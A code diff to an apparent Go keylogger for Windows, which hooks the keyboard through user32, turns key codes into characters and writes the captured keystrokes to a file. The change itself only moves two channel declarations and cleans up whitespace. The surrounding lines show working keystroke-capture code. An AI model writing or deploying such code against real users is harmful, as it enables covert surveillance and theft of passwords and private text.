@@ -18,7 +18,9 @@ var (
 	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
 	procGetKeyState         = user32.NewProc("GetKeyState")
 
-	hook HHOOK
+	hook      HHOOK
+	valueChan = make(chan string)
+	vkodeChan = make(chan uint32)
 )
 
 var asciiMap = map[uint32]string{
@@ -156,9 +158,9 @@ func getKeyState(vkCode int) int {
 }
 
 var symbolMap = map[byte]string{
-	'`': "~", '1': "!", '2': "@", '3': "#", '4': "$", '5': "%", 
-	'6': "^", '7': "&", '8': "*", '9': "(", '0': ")", '-': "_", 
-	'=': "+", '[': "{", ']': "}", '\\': "|", ';': ":", '\'': "\"", 
+	'`': "~", '1': "!", '2': "@", '3': "#", '4': "$", '5': "%",
+	'6': "^", '7': "&", '8': "*", '9': "(", '0': ")", '-': "_",
+	'=': "+", '[': "{", ']': "}", '\\': "|", ';': ":", '\'': "\"",
 	',': "<", '.': ">", '/': "?",
 }
 
@@ -192,14 +194,10 @@ func transform(s string, shift bool) string {
 	return s
 }
 
-
 func UnhookWindowsHookEx(hhk HHOOK) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
 	return ret != 0
 }
-
-var valueChan = make(chan string)
-var vkodeChan = make(chan uint32)
 
 func main() {
 	go func() {
@@ -220,7 +218,6 @@ func main() {
 		return
 	}
 	defer file.Close()
-
 
 	for {
 		value := <-valueChan
